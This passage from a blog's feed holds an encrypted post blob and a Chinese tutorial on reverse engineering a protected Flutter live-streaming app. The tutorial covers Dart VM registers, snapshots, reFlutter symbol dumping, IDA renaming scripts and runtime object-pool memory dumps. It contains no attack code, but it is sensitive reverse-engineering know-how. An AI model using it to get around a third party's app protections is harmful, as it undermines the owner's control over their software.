326eeee6f7ab8db8a0abffff0d25aaab66ef346ff1b0a0a167b522932640e988cf8195800dd4bbc6e8b2ac6927b2e779dd707f52cbc330e731bdae160e7c8cb2dcd7c4f789a161f70fb14c0d7958e7645b3699a6d6f96d8ac4a310e998fe79e8fc11259820c310a74d615abf30d8a0ff92dc6f3b3ea00bd36ad3aeec947e72f2ee690cacfc0d030cd5a7360290a87b6329b97c753822cb7354148ed2113367eea3d6f09fb1df7633cb5410a44fc4d21ce3be72bddcc1085bf68a551cfea434cc051e19703da5823d824ed164ea253820d52c1d9d71a9d6f073884c4ec1800e5447c2e40b0bc95d41106f8c61edbb9f91d28487d3cbc09bb002079bde41fc775af4ec7e6638bbddf6090fbef5e8b0f2db813eebea3247a930c2ac7e1617c486e12d7bc854bd0f40722983859699bf0b4c6987687298bee9faa86f30fa523691118c65bafdc5759d03dea3187446fc8cece3f0d5eb8212d5be4c6f8f877fa8fd425f9c184d71db075d8f581c5d8f290ef1ebb92c6ebb838690cc2283758f688685dca00bcc325a9bb63cd376437114e4bbb0ca2bcdcc50edb7f32302236da17b850268e71b9fb5706763d69ccf62115b633d84b1b086e036122c258ce764cdbaf76f04467a6c8f594533cdc315c25c342cd90bb2c0f49de3302954602cb3d3fd5e834960aa0085956de9ce928b67060005958ec5e2e01b83689b585f4f33c95253e25479e11a3cdcefb4f5a31f189702341564199b5a2a940909b704e2eb34b90bcf34eebb7bee8a7817d410bf353fac086b8e6d59661e033f3cbc260a4a6db9d64777c462c4304b80eccfde980786fc3f9d25b68a0a346f84c649d86e25181edd75f0ac8632a84b25d6aea39a566c57415abf84cc5cd7d9e2509564771875bffae882947a3f60f9ebcd93fa368ff4f16452841254541abefa680b7d2b8f4d63dbae538da8706f94525b121715d4921c2b74f3cc6d8314eeb738640d7427c1228e934ad8493db502f59df327b92a12e9bc358d5ec5352233cf6a3fe24f2cdfe80e614473d92d665baa0c8b51d2f2821f85fa80fb1d094e3f0571b402baad8579c5a7535d5d8aa101ccd1d38d15e1c7c0a57facd717a7c2813b1ff4fbf653bb7f80e64d26a8058b6cdd57f84e12e664d8ad47e8d5ade4cdf0e898b1c19896269be374132a4afc6dc86890532629774641417904da627bfd7cc8dfc17a151262a42b2c3734afcfaa08143f3112a6fcf85fbcb2672cf99f468f606355b2e539281a71b07c6148860cbf1226fb840c38f3bc5a8aa5d5798626f04e6ef9885aeaa1ac38ed3974bfe50318ff4ddc31be551fb14af7333aad1a0fb3faf841d29138728b16470d4911b7d80c17a3570fe3f599a830033ff46eae6c1c353dfcc14e1897999f3752558833cc98ecedd873722ea12494795e496611214d3909e51d915f6349809cc1cc9d5691e01b517e9730494259ba75d3bed28fe29f17602fa0437d487da2715b3991114ce421b94e2a5e737c4776f0db285bec92e6291af46f4fd71c0709dd967534496710db525d2a4ec6739af5a46589f9aa86a3539908a2e4e8ff332b3cea7e103c455f06f8bea3ea80d1f748effa5f1beccdf784d02ec3fd8b2cb41628c2c2ec62a6ca0798388d863c502737584f62c45f1cf8d580376978b4b0df2302b5deb0c7ef3b88f06ede67a64842c2da6060fb9a07a1681b9b24665564edaf0d9ad69504b611667cb480d394e45521f20599c79613f661e263de325463f6d23aa8d0eefc1286161bbc58654be91d289753f05397136f39b6a7b7585728b7eac66fea49601f2fa03fe9748c08639cdc41a1f15ee28847bb649e1bca48f54538ed69287ab09c75c25d8b6d88a355bbbb4e7c08a88bdc94e5b1e915d9e5713d00436ac0fffd91929d689db9038c3c973c6b788e845d940d9e4b02951142abf96375e84aec5a5dc5aa4a361cdaa3c15227e7f1c1608cfee3db6da1a432280ffdc2efc5fc760cb4b977389d3dd82112474c7517030a64c5df3ea40151b985992f75fc567184a7d2e94107820c571329c53294510553033eb15f57b40ad1275be1903ff68ddd4afc0c5b2e7fc76900631158269d01ffe10eb22ae678fe7998e74d12b344f28f3d8c258d77ea341fe0979abb799b827f9915c6446701169dd7a2c16137d57599041bfafbc1dc666d6020281bf9fb26506480e5fe16543c4eb2197641aff6c1bc0666b40d422caec625dc782a1220fc7a91e59e70f0661999159d8c12cab87cff562b8fbd1f7e98b765d22598efc44a9395a740b34dbdf6d6763687b098a7c4ca2e08f1de6b2430c7a9dd84831982f4b3469c2767deb7332307d727d123f08e1d2c54474b7210e129c9c949a23e9fec8bcf48ff1e46a6908a5b8a45b45a592dd6bcc1f0297afaab0e9067aab7c3d3eb5d88ffcdacfbf38629a05d888760e8411ceb6d1b847ce03e85abc557a24a9f05a442564475a3ed61cc0177fa9e2b399b30d7845e71bc91260e47cdbc777cbcfa22cf4552a3340fead15f3a693331a8292a309bd4804adb8e2587e440382fcb03ec43d4445ff12f9191dfe8ed14a532a41fefc72a77e36d0d2453803c3500495913097118d675f5b4f6724c4c73a7386bb7ff912454c53099e4a643017e2eed88a6f9e837c8c95090d69d943cf8d069b3aa6773acde7842425f90619012d5bc25234ea848a7bf8040e0cd1440d44aa49483cd3a6a9080739b0cb8d18f3352b1b886b6af4291d8a3b79ac5289d82e583a07136218b8ca4f02aca51f9bf35024f5005e70aa82a196bd49ae953ece0cf2c8631ea57991579534165d05658fb4812c049ba0b2aa1da3f7a9d021c77d43849448f8f7b55dc6e51dac284006bbea534b15716ee183c9c7cc6b599d740cefd08315642c923b047e9b285aa653bf9569792fa8c27f07301f2a6795ff471d685c7df1fd41fdf2152afeeb8160f40cb3f5f63c370816b62e12e11515042b9f7a360c1cb26fb7bcac433aa7fb13f6d09a9763d9dc3b64a1520d83827ed3f2fc6e4564024cad2a12611009865ec00242de976afb24a2219163d5f2c2a94f79ea2bfa65c5261f4f417d9c070f1693f4bc41373854087d79e1b40005864c652fadb0a6e1a187f248613c127b3dcd7db2b80576089c2074dc1966afc46b770d2680b7b762eb6360caed5e2aa8ba60b84d98e0bb1d6783c30c69f870a729299a7fe31211c2a2551487c0ee5036130168a677e9b50334dc019e11d1009485b819e141a76174ba721917b835285c64dae5214af5d22c94db78db91afc85a0ed5267d6e01e6da146130a5db116be67dedcf39c85fd1526ef23d5404506cf7372494e5d9e6c5c44d4448cac2293dc08e286e277522182b8d150a85c5cc46cc78fcdb1edd372ec5da95384766dc8e7c2a5ef99eba62a26fc1ff49884d1c797cfa0ffe04fbbf0c7212d135a72cf9d704f9ff1150094bf573122d9b35b9d93a59527663fb575af65a54d1ff3e4bebb2d95274a3c83f5ea0a0c27fb4fffb623397ba1ec6f749dc3355442a70cf7e48c576a2d07a80503404bc27b73dbd95acb6a3ea0b6fa96544304e3eaa229bb966a4b7d3a06d849d62a3380b7b453d98b87400ed42a8d4bb065184022841d0e0a41d190caacc4b11208b4b8d78777e33a8537851d665f680ae524c35ccad514d5018dc9910a56222ea1253c51f3bd3ec51694189ef43ecc51fc06532dafe1dbdcdf39ffa88f9a2fa6beae22d73f43faba2ee14b62b2c7f76865a7541d0800d674a669539d3481664d5ede9aeb8f67fd898ea47355cbefcb49f103c0d8debb52a527f19c0f864918de042a0b4f768c99d84a52caa15f5ab4438ac3882a155e400fcf8e500c5bd19a0ea819e5cfbf2cccd2881beb851cdd61f8e03f81ea53a2eba8b4350807564f3423bb6b1edf520aff50bb73f123229242bdcb348ec550c49a7502c5a13bb346d6f63d64b298974c474b17aa914645863b28494dabbf9baaf2fa6428e346f36a5e16841ba3ad964289e36bc6d814b1b14cc5862ec6cecb7ed909057d8224fab3072cc7f095eb95aaae2bb686190b21b380a7844dd0b11b3becc0f1433fbc7d7fe4c9ec07b5ef6fe229b3f6ed4589c4b8fa6c37d32acb0db346381fd64aad89f62f73b184b6eeb21b4506b2e58052092c5c662ca55787d7765fbb55c411c1ace31fcbd5c239d6618c71b38768eecad09dab7123f368ae35dffde9497478ee85971575a51731817b409b37a8a543cf3c2d909d86e3f975bd1391e576828fbce588492c568dafddb00a3a52d56d940d5f75edcff308abbbc3d7bb0ca5d6f3906ebfe37f6a4a0cdf8775e257aec577c7648ae250646f91cce0d6b6f47f735a2e70f820fdafdb9bc34354bad04fb7c0bf514ad1d2e08d5ca53a0b7546493ba4283ac354f5cf4fa22401ff38ddac3c3775ab1e65b996389533aa79984977487582fa11819049bf519d32a7de296f752619910b76cf1465fc012c4b0e341158c1750334dd2ae90b3359eed57c7f49bf1d757808b2363c0f93d95a981c19dda2c4e5b136908351fcfe11d6b1c32da02240263a5bbdb04b5fc46c942076a148ba0fe3808841ebc6fb50bb01b2d63a4ff601025b041de8e6825859da7121fbe8bffd258e32bbc7d49dc79fc4bdf88d2ca78d1e225faf9416c4288298da34eefd7f01f5151fb289477b0df05ca1d456d8f26db4008ab54b875304662297f168f5ee2523738efe58520e6f931f1b27d03185684f0cbc94806b9467b82fbb9b2bc138d91d878be42e32f9367f155ded67a5bb157214a13b14cc0618e1159e72aff62b7c957ca1167d5be70c62cb28567e4d7c3450002d9f7a26ff8ba90e6f34e24c74ec17d171fcdc7d80656c7f74c51ace2bb78305f9bb6bb9a24ce7c33bea88873952263a05501d0f96006634debc95239b54d15752574e249f13ac651d1187d92a59a6a396680a26c4d8951bcd32e37fc1c600707bf107344d55720f19430f0a11f049443dcb79b3065cda2ed950c36bfde9ba5060cb01a9dbd21adfb237d5a1af6b84515f00e918e485685649249d8a7d70a63c9786b066cb2265b081c26051988e0d19c8be3ba9b5bb2107c8882a2d7d66d6276f5f238f3559cb1d108a3f4e7dba24046db51066b7e08b8869cd85d65b01cfbd231d18401c2ed9705836cc386dc2d6f18c24908371600a205d1ac7ce3d1060abee8158232b4ad1b7f800ee16a6ec6f9a4fbf7c69fb5d7550b4d710897fff4ce2ceb25ef2846e38c5d1cbe7602d962ad4c9914af7f50411cf12a1c11b5660306be5bf2ed6e08ef5e3c6c82537f041d2fc45469691be4e58962a8dbc5bfd5ada362899f4fba9392295678089c34bb0b17c0f1610884acb5103ae1e5dc1b0c06a23dd7f2314f17ff8bffa82e7ad564ab6f3901f63e939b8d1bb1acf3818be68cd3995c28b37c0474a6ff6af6ff68aa2cbbc52d240edb31b680754af7cbc7c899362deba5ebeee5f108e69d642137bfcc70f344e012dd250cb0da5d0935225b254eac343723ef9b877b08912213798292cf2ea7043c64b99d8e026ccae1239e74050a19dd52b456fa4187ece0bb3248a80e4901f86bfcd4e9993e77425995da4a45c2f230fa8b06a4141d77910591b75a59d20f82ecf084f08d2dbfbb3d2320b0632771980a589b02cf4242cfd0529993ea5c9b413837afd0bfb28ae4b09ae2fe7cde6e24a03d9b331392c6e8735d771198998f6def5688d1f4c9134900c7be0a23226ce07eb6c2404c84a1f18142561d095dc266ce7211332fcecd80e5f8ef1b38fdd9ea0d28e3c9c0323526ee729110e145c97fdd32acc36fa5d6830864ea79a5ff9806c4e809aadeb50daa763f78e8240c054991543a55773f775ae1ee957c998a713ea4d68a0cb8c6366f4af33e1fd4dcb137a2e18c853e76629dec081e80f73ce0921597f7a73d8e092f8f38ad408ec742cfa83636f89d2f40b423ecd3f1da2114d46d571af0c9ca732fec884c0bab6e97efe35cf7aa9ef286623b9f9949cf02c96cd74933c386b9cac2e7e4468df4d418a0a93b72dcf0d411f1e1098be00666f7d56e85d272c261ac4cbe7168b60819caa1d58473c80840e9bd3c5c978de7d429b635adf3565e679d7bde6f8753b0ff7728668447aca85a98d0eae954d403535d89a9be2305a3f1b35122451ffaecd970514ae17d13e40a5594e870bacffb609106e4e1e293f9cf78bcf94114316c83d4b9240c1ddfe7d48ea5479133671cbf78ccdf9178cdcb42bfdc93ab60bbb67a9084450701ca4191df87344598b7a6449712378dd67899e721bd87b749a1aa1e47a2e5d6ee8814dd96050ff9cca4849eef76c70d567c6cb89f65558ccf58240cd36d766a34ccbe2b4558f51831ea13764c10b3d9d9664de5348b6206491222eb27466b468d0d9deb74169f4080f4f44ba21fc9d6082462c7836537d75737a2304a566ca5631a265266b9d59d6114307f2db06c9e359548ac21021809eb9d83813a88a9cf2366c89d1cc036749d61c70bc2a405a8ccdf32ab32cc08c403ee1e28aa935626e812c34c63a1323fc16ace31b9c62eea1f55e53b52c6f26f643548700201e59bef53fcd949d8ed8cdeac52ef194fcfc2ea6459c635b5ee3c90b9882f5daf8163895ecf1d87438e2fc9cd0a652e0dd64b3efd1884c84fcf36658533ff11ee30e130e56526ed01e75b36144190dc65d220928df4df23e1e8e8aa55f0d1b65cd23806602292e6beb522f2ffb756ca52aa82d2bdd1a994563f57cc44a8b82b520243d0820a447109831bf48723f00c68e44d675b729014ce7792a8240a1adcedec3a29f6e1922d5504fff1a874cc90a6fe8c56a0f4f7d9e033dc19365309502cb71f73a9ca87e0ac69779b4bf55f9590ae3387c8c764eaf988239ed688e0620981d59465c98eb767097081ab91e7abdabb95da220ea3a658bb853bfe72fc949e85808fa3213a069c3cb4ec182e1f2afa5ff64c134518461bccc24b37e2039261f0247f4c74dd97b9384e1265f09c39551b16516b49a7762bb600aa76b5a6a65f00ea18b47c920393f9e521a30cd65479b19a6c2bcf7aa77d1e33adb480916ba2240631f3198c371208c05fdd2ee424010514d6fa4ecd609728508d5d32685fa0819c8c005c2c5dfc9e12e4aa41347b6dce0e22ce2f931d954d0b332ee8410691ba10fee63da88db84404c23cc0d668ecac6a26e0004f6e7ed57d173d544bb6c33af34d701ec21019b967013a1da061a1c79bc514eb438210dc04fef7439ca145816ef70ad2606a1f9b7158e17491bfd412dca6738d09067db59f43521e5df7725a59904cc335d1530ff60da0a3c986cf52b42a4ca35d212f90a1f52b8e6e6f03466457e2441deaa534bf671e63eabfbb7e304478bb677dce24aa072a0df61434ab3b73ecd01891205de9a33347b4e7ac9a8030f7237e0179159070fcbbc0d07cc205433f1a2a895dc2c346f4f3c604e45f2bdc3479e1cf757605ce0340dedc77a90312e1957c88130e9f00fe4ad40bd2eeac8ec68effb5bcebc91256ed844474a39eb72bf32e3afeea8887e17f368f1589eb3a9ab22e2c11c1857451ac509e81b886bb40bbc7a5de574e91adaaa0b4690f04466f0d9504d79cc2beb79efc97e6029704612668841bb08859da8e85877fdf43994043d8e0a5afdd1ad930246319167a577d1f1116c67ef51d26ba5c0376b0e27f8ff55e741b1835d8c7ed1b25de2dcc829a56ad3e7c7d82f287d2622104d47f2fe78a7a50e0c136bceedbc95057f11d3d859258c022482d027d2146dcf23c9fb7d948d038e86432659ca8d4b4668cee702c1ade0b96e31194fe60799593f07ebfdcbf36c5a73cb7eed822df23fe53ce7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-shrink">      <input class="hbe hbe-input-field hbe-input-field-shrink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-shrink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-shrink">当前文章正在施工中，暂时无法对外开放。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">江湖春水多</summary>
    
    
    
    <category term="Web" scheme="https://yzctzl.github.io/categories/Web/"/>
    
    
    <category term="Web" scheme="https://yzctzl.github.io/tags/Web/"/>
    
    <category term="Sec" scheme="https://yzctzl.github.io/tags/Sec/"/>
    
    <category term="Black" scheme="https://yzctzl.github.io/tags/Black/"/>
    
  </entry>
  
  <entry>
    <title>尝试逆个简单的 Flutter App —— 𝘚</title>
    <link href="https://yzctzl.github.io/2023/KBLive/"/>
    <id>https://yzctzl.github.io/2023/KBLive/</id>
    <published>2023-04-07T16:00:00.000Z</published>
    <updated>2023-04-07T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Flutter 是 Google 发布的一个跨平台的框架，其基于 Dart 语言，运行于 <a href="https://mrale.ph/dartvm/">Dart VM</a> 中，其中的寄存器有自定义的使用规则、还有自定义 ABI、自定义的 Stack 等，加上其目前处于快速发展阶段，变更频繁，导致逆向非常困难。</p><p><a href="https://gitee.com/ReactJSTeams/next.js/raw/master/examples/nested-components/.gitignore">𝘚</a> 是当前直播盒子行业的领头羊，支持国内外近乎所有平台；其用 老版本 Flutter 开发，尽管 Java 层加了 360 壳，但并不影响使用 frida 和 IDA 等工具 hook，下面一窥其内部协议。</p><h2 id="Flutter-逆向基础"><a href="#Flutter-逆向基础" class="headerlink" title="Flutter 逆向基础"></a>Flutter 逆向基础</h2><p><a href="https://blog.tst.sh/reverse-engineering-flutter-apps-part-1/">Reverse engineering Flutter apps (Part 1)</a> 这篇文章提供了关于 快照、寄存器、Object Pool 等关键内容的信息，推荐首先阅读。</p><h3 id="Dart-VM"><a href="#Dart-VM" class="headerlink" title="Dart VM"></a>Dart VM</h3><p>目前来看，下面这篇应该是最权威的介绍 Dart VM 的文章：<br><a href="https://mrale.ph/dartvm/">https://mrale.ph/dartvm/</a></p><h3 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h3><p>关于寄存器定义源码在：<a href="https://github.com/dart-lang/sdk/blob/main/runtime/vm/constants_arm.h">ARM32</a>, <a href="https://github.com/dart-lang/sdk/blob/main/runtime/vm/constants_arm64.h">AARCH64</a> 中，其中 Arm 指令集变化并不大，但 aarch64 变化较大。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># ARM32</span><br><span class="line">r0  -  r1 |     | Returns</span><br><span class="line">r0  -  r9 |     | General purpose</span><br><span class="line">r4  - r10 |     | Callee saved registers</span><br><span class="line">       r5 | pp  | Object pool</span><br><span class="line">      r10 | thr | Current thread</span><br><span class="line">      r11 | fp  | Frame pointer</span><br><span class="line">      r12 | ip  | Scratch register</span><br><span class="line">      r13 | sp  | Stack pointer</span><br><span class="line">      r14 | lr  | Link register</span><br><span class="line">      r15 | pc  | Program counter</span><br><span class="line"># AARCH64</span><br><span class="line">       r0 |     | Returns</span><br><span class="line">r0  -  r7 |     | Arguments</span><br><span class="line">r0  - r14 |     | General purpose</span><br><span class="line">      r15 | sp  | Dart stack pointer</span><br><span class="line">      r16 | ip0 | Scratch register</span><br><span class="line">      r17 | ip1 | Scratch register</span><br><span class="line">      r18 |     | Platform register</span><br><span class="line">r19 - r25 |     | General purpose</span><br><span class="line">r19 - r28 |     | Callee saved registers</span><br><span class="line">      r26 | thr | Current thread</span><br><span class="line">      r27 | pp  | Object pool</span><br><span class="line">      r28 | brm | Barrier mask</span><br><span class="line">      r29 | fp  | Frame pointer</span><br><span class="line">      r30 | lr  | Link register</span><br><span class="line">      r31 | zr  | Zero / CSP</span><br></pre></td></tr></table></figure><h3 id="快照"><a href="#快照" class="headerlink" title="快照"></a>快照</h3><p>libapp.so 是 Flutter 的一种快照，Flutter 中有 三种快照：</p><ol><li><code>kernel</code>: 实际上只是生成了 AST，运行时：AST -&gt; IR -&gt; ASM</li><li><code>app-jit</code>: parsed&#x2F;compiled 所有的函数和类（train run），到时仅运行 user code</li><li><code>app-aot</code>: 从 main 开始完整的编译所有代码</li></ol><p>平时打包到 apk 中的就是 app-aot 格式的快照，相当于 vm heap snapshot。</p><p>对这三种快照的介绍：<a href="https://github.com/dart-lang/sdk/wiki/Snapshots">Snapshots</a>，更多关于快照的内容 <a href="https://blog.tst.sh/reverse-engineering-flutter-apps-part-1/#anatomy-of-a-snapshot">Anatomy of a snapshot</a>。</p><h3 id="确定版本"><a href="#确定版本" class="headerlink" title="确定版本"></a>确定版本</h3><p>可通过快照 Hash 来确定，比如 𝘚 使用的是：8ee4ef7a67df9845fba331734198a953，如果抹除了快照 Hash，暂时无法确定版本。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/kb_flutter_ver.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/kb_flutter_ver.png" class="lazyload" data-srcset="/img/2023/KBLive/kb_flutter_ver.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>在开始逆向之前，应该做一些准备工作，来降低逆向的难度，主要是按照下面两篇文章：</p><ol><li><a href="https://www.guardsquare.com/blog/current-state-and-future-of-reversing-flutter-apps">The Current State &amp; Future of Reversing Flutter™ Apps</a></li><li><a href="https://www.guardsquare.com/blog/obstacles-in-dart-decompilation-and-the-impact-on-flutter-app-security">Obstacles in Dart Decompilation &amp; the Impact on Flutter™ App Security</a></li></ol><p>但因为文章中是 64 位的 app，所以需要做一点点修改，具体参考左侧仓库中的 arm32 branch。</p><h3 id="提取信息"><a href="#提取信息" class="headerlink" title="提取信息"></a>提取信息</h3><p>Flutter 快照中存在符号信息，但无法被 IDA 正确识别，若要提取信息，有两种方法，第一种是解析 Dart 快照，比如：<a href="https://github.com/mildsunrise/darter">darter</a>, <a href="https://github.com/rscloura/Doldrums">Doldrums</a>，但因为其快照格式更新频繁，所以维护成本高；第二种方式方法是：魔改 Flutter runtime library，使程序可以在运行的时侯 dump 出有用信息，其最知名的就是 reFlutter。</p><h4 id="reFlutter"><a href="#reFlutter" class="headerlink" title="reFlutter"></a>reFlutter</h4><p>使用 reFlutter 需要重新打包 apk，也可以使用 <a href="https://bbs.kanxue.com/thread-275287.htm">flutter 逆向助手</a> 基于 reFlutter 但不需要重新打包即可 dump。</p><h4 id="Obfuscation"><a href="#Obfuscation" class="headerlink" title="Obfuscation"></a>Obfuscation</h4><p>Flutter 默认自带混淆插件，会混淆函数的符号信息，如果此时恰好有旧版本没有混淆的，那么可以使用：<a href="https://www.zynamics.com/bindiff/manual/">BinDiff</a> 或 <a href="https://github.com/joxeankoret/diaphora">Diaphora</a>，通过对比来确定函数名，具体参考第一篇文章。</p><h3 id="Rename-Functions"><a href="#Rename-Functions" class="headerlink" title="Rename Functions"></a>Rename Functions</h3><p>拥有了类和函数的符号信息，下面就可以将 IDA 中对应偏移的函数重命名，首先要做的就是把 reFlutter 获取到的 dump.dart 解析以下，转为 json，方便重命名，具体参考 <a href="https://github.com/yzctzl/flutter-re-demo/blob/arm32/parse_info.py">parse_info.py</a>。</p><p>解析完成后，可用 <a href="https://github.com/yzctzl/flutter-re-demo/blob/arm32/rename_flutter_functions.py">rename_flutter_functions.py</a> 这个 IDAPython 脚本批量将 json 中的信息 全部重命名到 IDA 数据库中。</p><div galleryFlag itemscope itemtype="http://schema.org/ImageGallery" class="gallery " data-group='default'><div class='fancybox'><a class='fancybox' pjax-fancybox itemscope itemtype="http://schema.org/ImageObject" itemprop="url" href='/img/2023/KBLive/rename_func.png' data-fancybox='default' data-caption='undefined'><img fancybox itemprop="contentUrl" src="/img/2023/KBLive/rename_func.png" class="lazyload" data-srcset="/img/2023/KBLive/rename_func.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div><p>完成函数的重命名之后，对 𝘚 而言就可以使用 IDA 进行动态调试了，下面的步骤也非常 重要&#x2F;有趣，尽管对 𝘚 的动态调试动态调试影响不大。</p><h3 id="反汇编很奇怪"><a href="#反汇编很奇怪" class="headerlink" title="反汇编很奇怪"></a>反汇编很奇怪</h3><p>伪代码非常不可读，甚至不如 反汇编，这是为什么呢？</p><ol><li>Flutter 中所有 object 都是通过 object pool 间接引用</li><li>Flutter 使用了自定义的栈 r13&#x2F;x15，并且通过栈来传递参数</li><li>Flutter 使用自定义的二进制接口 (ABI)</li></ol><p>下面就根据第二篇文章的内容，来完成修复。</p><h3 id="Object-Pool"><a href="#Object-Pool" class="headerlink" title="Object Pool"></a>Object Pool</h3><p>Flutter 中所有类都是通过 Object Pool <code>(R5/X27)</code> 来间接访问的，这就导致 IDA 反汇编几乎找不到任何类。</p><p>保存到快照中的 object pool 是序列化之后的，这些内容无法直接使用。想要反序列化之后的 object pool 需要 dump 运行中的内存。</p><p>那么如果想要恢复出 Object，要将 app 跑起来，具体步骤为：</p><ol><li>dump 出运行时 r5&#x2F;x27 指向的附近的所有内存</li><li>rebase libapp.so 使其和 dump 出来的内存对齐</li><li>手动读取 object pool，导入其中 object 指向的内存块</li><li>使用 ida python 脚本恢复 object</li></ol><p>具体的方法和脚本，参见左侧仓库：<a href="https://github.com/yzctzl/flutter-re-demo/blob/arm32/hooking/dump_flutter_memory.js">dump_flutter_memory.js</a> 或原文。</p><h3 id="object"><a href="#object" class="headerlink" title="object"></a>object</h3><p>以下对结构的讨论仅对 𝘚 起效，其他版本的快照，需要根据 <a href="https://github.com/dart-lang/sdk/blob/2.16.2/runtime/vm/app_snapshot.cc">app_snapshot.cc</a> 做些修改。</p><h4 id="object-结构"><a href="#object-结构" class="headerlink" title="object 结构"></a>object 结构</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">DartObjectTag</span>  <span class="comment">// 4B</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> is_canonical_and_gc;  <span class="comment">// 1B 表示引用数量？</span></span><br><span class="line">    <span class="type">char</span> size_tag;</span><br><span class="line">    __int16 cid;               <span class="comment">// object 类型 ID</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">DartUnkObject</span>  <span class="comment">// 未知对象</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> is_canonical_and_gc;</span><br><span class="line">    <span class="type">char</span> size_tag;</span><br><span class="line">    __int16 cid;</span><br><span class="line">    &lt;<span class="type">int</span> padding&gt;  <span class="comment">// int: arm32 = __int32, aarch64 = __int64</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 常常是一个指针列表，依次指向该对象的各种属性</span></span><br><span class="line">    <span class="comment">// DartObject *attribute_objects[]</span></span><br><span class="line">    &lt;unknown <span class="keyword">class</span> <span class="title class_">specific</span> data&gt;</span><br><span class="line">    &lt;<span class="type">int</span> padding&gt;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">DartString</span>  <span class="comment">// 字符串</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> is_canonical_and_gc;</span><br><span class="line">    <span class="type">char</span> size_tag;</span><br><span class="line">    __int16 cid;    <span class="comment">// arm32 = 0x51, aarch64 = 0x55</span></span><br><span class="line">    <span class="type">int</span> s_len;      <span class="comment">// int: arm32 = __int32, aarch64 = __int64</span></span><br><span class="line">    &lt;<span class="type">int</span> padding&gt;</span><br><span class="line">    <span class="type">char</span> s[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">DartBytes</span>  <span class="comment">// Bytes 串</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> is_canonical_and_gc;</span><br><span class="line">    <span class="type">char</span> size_tag;</span><br><span class="line">    __int16 cid;    <span class="comment">// arm32 = 0x6F</span></span><br><span class="line">    <span class="type">int</span> b_len;      <span class="comment">// int: arm32 = __int32, aarch64 = __int64</span></span><br><span class="line">    &lt;<span class="type">int</span> padding&gt;</span><br><span class="line">    __int8 b[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">DartObjectPool</span> </span><br><span class="line">&#123;</span><br><span class="line">    DartObjectTag tag; </span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> nb_dart_objects_in_object_pool;  <span class="comment">// int: arm32 = __int32, aarch64 = __int64</span></span><br><span class="line">    DartObject *object_pool_array[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="odd-pointer"><a href="#odd-pointer" class="headerlink" title="odd pointer"></a>odd pointer</h4><p>指向 object 的指针都是奇数，这是为了区分对象和数字，数字是偶数，这就代表：如果一个指针是奇数，那它指向的内存是从其指向内存的上一个字节开始的，比如：0xBF965CC1，它指向的其实是 0xBF965CC0 并且这块内存对应的是一个 object；另如：0xBF967750，它指向一个数字。</p><h4 id="创建-IDA-struct"><a href="#创建-IDA-struct" class="headerlink" title="创建 IDA struct"></a>创建 IDA struct</h4><p>通过上面的步骤，导入 r5&#x2F;x27 指向的内存之后，就可用 <a 